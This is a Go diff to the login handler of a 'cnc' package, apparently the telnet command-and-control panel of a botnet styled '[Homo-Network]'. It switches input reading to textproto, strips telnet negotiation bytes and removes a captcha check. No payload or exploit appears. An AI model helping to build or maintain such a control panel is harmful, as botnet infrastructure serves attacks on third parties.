@@ -1,10 +1,11 @@
 package cnc
 
 import (
+	"bufio"
 	"bytes"
 	"fmt"
-	random "math/rand"
 	"net"
+	"net/textproto"
 	"os"
 	"strings"
 
@@ -40,13 +41,11 @@ func LoginPage(conn net.Conn) {
 
 	conn.Write([]byte(gradient.Rainbow().Apply("[Homo-Network]") + color.HiWhiteString(" Enter login: ")))
 
-	login := make([]byte, 1024)
+	reader := bufio.NewReader(conn)
+	tp := textproto.NewReader(reader)
+	_login, err := tp.ReadLine()
 
-	_, err := conn.Read(login)
-
-	login = bytes.ReplaceAll(login, []byte{0}, []byte{})
-	login = bytes.ReplaceAll(login, []byte{13}, []byte{})
-	login = bytes.ReplaceAll(login, []byte{10}, []byte{})
+	login := bytes.TrimPrefix([]byte(_login), []byte{255, 251, 31, 255, 251, 32, 255, 251, 24, 255, 251, 39, 255, 253, 1, 255, 251, 3, 255, 253, 3})
 
 	if err != nil {
 		fmt.Println(err)
@@ -66,32 +65,6 @@ func LoginPage(conn net.Conn) {
 		fmt.Println(err)
 	}
 
-	capt := GenCaptcha()
-
-	conn.Write([]byte((gradient.Rainbow().Apply("[Homo-Network]") + color.HiWhiteString(" [ "+capt+" ] Enter captcha: "))))
-
-	captcha := make([]byte, 1024)
-
-	_, err = conn.Read(captcha)
-
-	captcha = bytes.ReplaceAll(captcha, []byte{0}, []byte{})
-	captcha = bytes.ReplaceAll(captcha, []byte{13}, []byte{})
-	captcha = bytes.ReplaceAll(captcha, []byte{10}, []byte{})
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	if string(captcha) != capt {
-		Print(color.HiRedString("Access denied\n"), conn)
-		DeadSession(conn)
-		conn.Close()
-		return
-	}
-
-	if err != nil {
-		conn.Close()
-		return
-	}
 	accs, _ := os.ReadFile("./data/accounts.txt")
 
 	vv := []byte(string(login) + ":" + string(password))
@@ -122,15 +95,4 @@ func LoginPage(conn net.Conn) {
 
 func DeadSession(conn net.Conn) {
 	delete(SessionList, conn)
-}
-
-func GenCaptcha() string {
-	var letters = []rune("abcdefghijklmnopqrstuvwxyz")
-
-	count := make([]rune, 4)
-	for i := range count {
-		count[i] = letters[random.Intn(len(letters))]
-	}
-
-	return string(count)
 }
